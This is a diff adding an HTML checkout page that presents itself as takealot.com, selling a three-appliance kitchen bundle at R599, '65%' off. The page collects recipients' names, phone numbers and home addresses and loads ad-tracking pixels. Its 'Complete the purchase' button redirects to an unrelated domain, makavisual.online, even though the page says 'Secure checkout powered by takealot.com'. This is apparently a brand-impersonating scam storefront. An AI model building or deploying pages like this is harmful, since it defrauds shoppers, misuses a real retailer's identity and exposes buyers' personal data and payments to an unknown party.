@@ -1,0 +1,652 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Checkout - Kitchen Combo</title>
+
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e);
+  s.parentNode.insertBefore(t,s)
+  }(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+
+  fbq('init', '1238580704010895');
+  fbq('track', 'PageView');
+  fbq('track', 'InitiateCheckout', {
+    content_name: 'Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle',
+    content_category: 'Kitchen Appliances',
+    content_type: 'product',
+    content_ids: ['kitchen-combo-3in1'],
+    num_items: 3,
+    value: 599,
+    currency: 'ZAR'
+  });
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "67918adf0b80f52dd2589822";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+
+<style>
+*{ box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body{
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+  background: #fff;
+  color: #111;
+}
+
+/* ===== TOP BAR ===== */
+.topbar{
+  background: #fff;
+  padding: 14px 0;
+  text-align: center;
+  border-bottom: 3px solid #0b79d0;
+}
+
+.logo-img{
+  height: 26px;
+  width: auto;
+  display: inline-block;
+}
+
+/* ===== ORDER SUMMARY STRIP ===== */
+.order-strip{
+  background: #f7f7f7;
+  border-bottom: 1px solid #e8e8e8;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+
+.order-strip__img{
+  width: 56px;
+  height: 56px;
+  object-fit: contain;
+  border: 1px solid #eee;
+  border-radius: 6px;
+  background: #fff;
+  flex: 0 0 auto;
+}
+
+.order-strip__info{
+  flex: 1;
+  min-width: 0;
+}
+
+.order-strip__name{
+  font-size: 13px;
+  font-weight: 600;
+  color: #333;
+  line-height: 1.3;
+  margin-bottom: 4px;
+}
+
+.order-strip__prices{
+  display: flex;
+  align-items: baseline;
+  gap: 8px;
+}
+
+.order-strip__now{
+  font-size: 18px;
+  font-weight: 800;
+  color: #111;
+}
+
+.order-strip__was{
+  font-size: 13px;
+  color: #999;
+  text-decoration: line-through;
+  font-weight: 600;
+}
+
+.order-strip__save{
+  font-size: 11px;
+  font-weight: 700;
+  color: #d32f2f;
+  background: #ffebee;
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+
+/* ===== CONTENT ===== */
+.content{
+  max-width: 480px;
+  margin: 0 auto;
+  padding: 24px 16px 40px;
+}
+
+.page-title{
+  font-size: 22px;
+  font-weight: 800;
+  color: #111;
+  margin-bottom: 16px;
+}
+
+/* ===== RESIDENTIAL BUTTON ===== */
+.type-toggle{
+  display: flex;
+  margin-bottom: 24px;
+}
+
+.type-btn{
+  flex: 1;
+  height: 40px;
+  border: 2px solid #0b79d0;
+  background: #0b79d0;
+  color: #fff;
+  font-size: 14px;
+  font-weight: 600;
+  border-radius: 6px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* ===== FORM FIELDS ===== */
+.field{
+  position: relative;
+  margin-bottom: 0;
+  border-bottom: 1px solid #e0e0e0;
+  padding: 18px 0 10px;
+}
+
+.field-label{
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: #888;
+  margin-bottom: 4px;
+  letter-spacing: 0.2px;
+}
+
+.field-input{
+  width: 100%;
+  border: 0;
+  outline: none;
+  font-size: 15px;
+  font-family: inherit;
+  color: #333;
+  background: transparent;
+  padding: 0;
+}
+
+.field-input::placeholder{
+  color: #ccc;
+}
+
+.field-select{
+  width: 100%;
+  border: 0;
+  outline: none;
+  font-size: 15px;
+  font-family: inherit;
+  color: #333;
+  background: transparent;
+  padding: 0;
+  -webkit-appearance: none;
+  appearance: none;
+  cursor: pointer;
+}
+
+/* ===== SAVE BUTTON ===== */
+.save-btn{
+  width: 100%;
+  height: 50px;
+  border-radius: 999px;
+  border: 0;
+  background: #0b79d0;
+  color: #fff;
+  font-weight: 700;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 36px;
+  letter-spacing: 0.3px;
+}
+.save-btn:active{
+  transform: scale(.99);
+  opacity: .9;
+}
+
+/* ===== ORDER REVIEW ===== */
+.order-review{
+  display: none;
+}
+
+.saved-btn{
+  width: 100%;
+  height: 50px;
+  border-radius: 999px;
+  border: 0;
+  background: #2fce6b;
+  color: #fff;
+  font-weight: 700;
+  font-size: 16px;
+  cursor: default;
+  margin-bottom: 28px;
+  letter-spacing: 0.3px;
+}
+
+.separator{
+  border: 0;
+  border-top: 1px solid #e0e0e0;
+  margin: 0 0 24px;
+}
+
+.review-title{
+  font-size: 22px;
+  font-weight: 800;
+  color: #111;
+  margin-bottom: 20px;
+}
+
+.review-label{
+  font-size: 15px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 2px;
+}
+
+.review-value{
+  font-size: 14px;
+  color: #444;
+  margin-bottom: 16px;
+}
+
+.badge-residential{
+  display: inline-block;
+  background: #333;
+  color: #fff;
+  font-size: 11px;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  padding: 4px 10px;
+  border-radius: 4px;
+  margin-bottom: 6px;
+  text-transform: uppercase;
+}
+
+.review-home{
+  font-size: 15px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 2px;
+}
+
+.review-address{
+  font-size: 14px;
+  color: #444;
+  margin-bottom: 4px;
+  line-height: 1.4;
+}
+
+.review-underline{
+  width: 20px;
+  height: 2px;
+  background: #111;
+  margin-bottom: 20px;
+}
+
+.delivery-date{
+  font-size: 15px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 2px;
+}
+
+.delivery-detail{
+  font-size: 14px;
+  color: #444;
+  margin-bottom: 24px;
+}
+
+.items-label{
+  font-size: 13px;
+  font-weight: 700;
+  color: #999;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  margin-bottom: 14px;
+}
+
+.item-row{
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 10px 0;
+  border-top: 1px solid #eee;
+  border-bottom: 1px solid #eee;
+  margin-bottom: 14px;
+}
+
+.item-img{
+  width: 50px;
+  height: 50px;
+  object-fit: contain;
+  border: 1px solid #eee;
+  border-radius: 4px;
+  flex: 0 0 auto;
+}
+
+.item-name{
+  font-size: 14px;
+  font-weight: 600;
+  color: #111;
+  line-height: 1.35;
+}
+
+/* ===== PRICE SUMMARY ===== */
+.price-summary{
+  background: #f9f9f9;
+  border: 1px solid #eee;
+  border-radius: 10px;
+  padding: 16px;
+  margin-bottom: 24px;
+}
+
+.price-line{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 14px;
+  color: #444;
+  padding: 6px 0;
+}
+
+.price-line--total{
+  border-top: 1px solid #ddd;
+  margin-top: 8px;
+  padding-top: 12px;
+  font-size: 18px;
+  font-weight: 800;
+  color: #111;
+}
+
+.price-line .was{
+  text-decoration: line-through;
+  color: #999;
+  font-weight: 600;
+}
+
+.price-line .save{
+  color: #d32f2f;
+  font-weight: 700;
+}
+
+.price-line .free{
+  color: #178a3b;
+  font-weight: 700;
+}
+
+.complete-btn{
+  width: 100%;
+  height: 54px;
+  border-radius: 999px;
+  border: 0;
+  background: #178a3b;
+  color: #fff;
+  font-weight: 800;
+  font-size: 17px;
+  cursor: pointer;
+  letter-spacing: 0.3px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.complete-btn:active{
+  transform: scale(.99);
+  opacity: .9;
+}
+
+.complete-btn svg{
+  width: 20px; height: 20px;
+}
+
+.secure-note{
+  text-align: center;
+  margin-top: 12px;
+  font-size: 12px;
+  color: #999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 4px;
+}
+.secure-note svg{
+  width: 14px; height: 14px; color: #999;
+}
+</style>
+</head>
+
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <img src="images/logo-takealot.svg" alt="takealot.com" class="logo-img">
+</div>
+
+<!-- ORDER SUMMARY STRIP -->
+<div class="order-strip">
+  <img class="order-strip__img" src="images/kitchen-combo1.png" alt="Kitchen Combo">
+  <div class="order-strip__info">
+    <div class="order-strip__name">Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle</div>
+    <div class="order-strip__prices">
+      <span class="order-strip__now">R599</span>
+      <span class="order-strip__was">R1,697</span>
+      <span class="order-strip__save">-65%</span>
+    </div>
+  </div>
+</div>
+
+<!-- CONTENT -->
+<div class="content">
+
+  <!-- ===== DELIVERY FORM ===== -->
+  <div id="formSection">
+    <h1 class="page-title">Delivery Details</h1>
+
+    <div class="type-toggle">
+      <button class="type-btn" type="button">Residential</button>
+    </div>
+
+    <form id="deliveryForm" autocomplete="on">
+      <div class="field">
+        <label class="field-label" for="recipientName">Recipient Name</label>
+        <input class="field-input" type="text" id="recipientName" name="name" autocomplete="name">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="recipientMobile">Recipient Mobile Number</label>
+        <input class="field-input" type="tel" id="recipientMobile" name="phone" autocomplete="tel">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="streetAddress">Street Address</label>
+        <input class="field-input" type="text" id="streetAddress" name="street" autocomplete="street-address">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="complex">Complex / Building</label>
+        <input class="field-input" type="text" id="complex" name="complex" autocomplete="address-line2">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="suburb">Suburb</label>
+        <input class="field-input" type="text" id="suburb" name="suburb">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="city">City / Town</label>
+        <input class="field-input" type="text" id="city" name="city" autocomplete="address-level2">
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="province">Province</label>
+        <select class="field-select" id="province" name="province">
+          <option value="" selected>Select</option>
+          <option value="Eastern Cape">Eastern Cape</option>
+          <option value="Free State">Free State</option>
+          <option value="Gauteng">Gauteng</option>
+          <option value="KwaZulu-Natal">KwaZulu-Natal</option>
+          <option value="Limpopo">Limpopo</option>
+          <option value="Mpumalanga">Mpumalanga</option>
+          <option value="Northern Cape">Northern Cape</option>
+          <option value="North West">North West</option>
+          <option value="Western Cape">Western Cape</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label class="field-label" for="postalCode">Postal Code</label>
+        <input class="field-input" type="text" id="postalCode" name="postalCode" autocomplete="postal-code" inputmode="numeric">
+      </div>
+
+      <button class="save-btn" type="submit">Save</button>
+    </form>
+  </div>
+
+  <!-- ===== ORDER REVIEW ===== -->
+  <div class="order-review" id="orderReview">
+
+    <button class="saved-btn" type="button">Saved &#10003;</button>
+
+    <hr class="separator">
+
+    <h2 class="review-title">Order Review</h2>
+
+    <div class="review-label">Delivery Method</div>
+    <div class="review-value">Delivery</div>
+
+    <div class="review-label">Delivery Address</div>
+    <div><span class="badge-residential">RESIDENTIAL</span></div>
+    <div class="review-home">Home</div>
+    <div class="review-address" id="reviewAddress"></div>
+    <div class="review-underline"></div>
+
+    <div class="delivery-date" id="deliveryDate"></div>
+    <div class="delivery-detail">Next Business Day Delivery &bull; Free</div>
+
+    <div class="items-label">ITEMS FOR DELIVERY</div>
+
+    <div class="item-row">
+      <img class="item-img" src="images/kitchen-combo1.png" alt="Kitchen Combo">
+      <div class="item-name">Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle</div>
+    </div>
+
+    <!-- PRICE SUMMARY -->
+    <div class="price-summary">
+      <div class="price-line">
+        <span>Subtotal</span>
+        <span class="was">R1,697</span>
+      </div>
+      <div class="price-line">
+        <span>Discount</span>
+        <span class="save">-R1,098</span>
+      </div>
+      <div class="price-line">
+        <span>Delivery</span>
+        <span class="free">FREE</span>
+      </div>
+      <div class="price-line price-line--total">
+        <span>Total</span>
+        <span>R599</span>
+      </div>
+    </div>
+
+    <button class="complete-btn" type="button" id="completeBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
+        <line x1="1" y1="10" x2="23" y2="10"/>
+      </svg>
+      Complete the purchase
+    </button>
+
+    <div class="secure-note">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      Secure checkout powered by takealot.com
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+function getDeliveryDate(){
+  var d = new Date();
+  d.setDate(d.getDate() + 1);
+  var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
+  return d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear();
+}
+
+document.getElementById('deliveryForm').addEventListener('submit', function(e){
+  e.preventDefault();
+
+  var street = document.getElementById('streetAddress').value;
+  var complex = document.getElementById('complex').value;
+  var suburb = document.getElementById('suburb').value;
+  var city = document.getElementById('city').value;
+  var province = document.getElementById('province').value;
+  var postalCode = document.getElementById('postalCode').value;
+
+  var parts = [];
+  if(complex) parts.push(complex);
+  if(street) parts.push(street);
+  var line2 = [];
+  if(suburb) line2.push(suburb);
+  if(city) line2.push(city);
+  if(province) line2.push(province);
+  if(postalCode) line2.push(postalCode);
+
+  var addressHtml = parts.join(', ');
+  if(line2.length) addressHtml += '<br>' + line2.join(', ');
+
+  document.getElementById('reviewAddress').innerHTML = addressHtml;
+  document.getElementById('deliveryDate').textContent = 'Delivery by ' + getDeliveryDate();
+
+  document.getElementById('formSection').style.display = 'none';
+  document.getElementById('orderReview').style.display = 'block';
+
+  fbq('track', 'AddPaymentInfo', {
+    content_name: 'Kitchen Combo - Delivery Saved',
+    content_category: 'Kitchen Appliances',
+    content_ids: ['kitchen-combo-3in1'],
+    value: 599,
+    currency: 'ZAR'
+  });
+
+  window.scrollTo(0, 0);
+});
+
+document.getElementById('completeBtn').addEventListener('click', function(){
+  fbq('track', 'Purchase', {
+    content_name: 'Defy 30L Microwave + Russell Hobbs 6.5L Air Fryer + Mellerware Glass Kettle',
+    content_category: 'Kitchen Appliances',
+    content_type: 'product',
+    content_ids: ['kitchen-combo-3in1'],
+    num_items: 3,
+    value: 599,
+    currency: 'ZAR'
+  });
+  window.location.href = 'https://makavisual.online/loja/kitchencombo';
+});
+</script>
+
+</body></html>
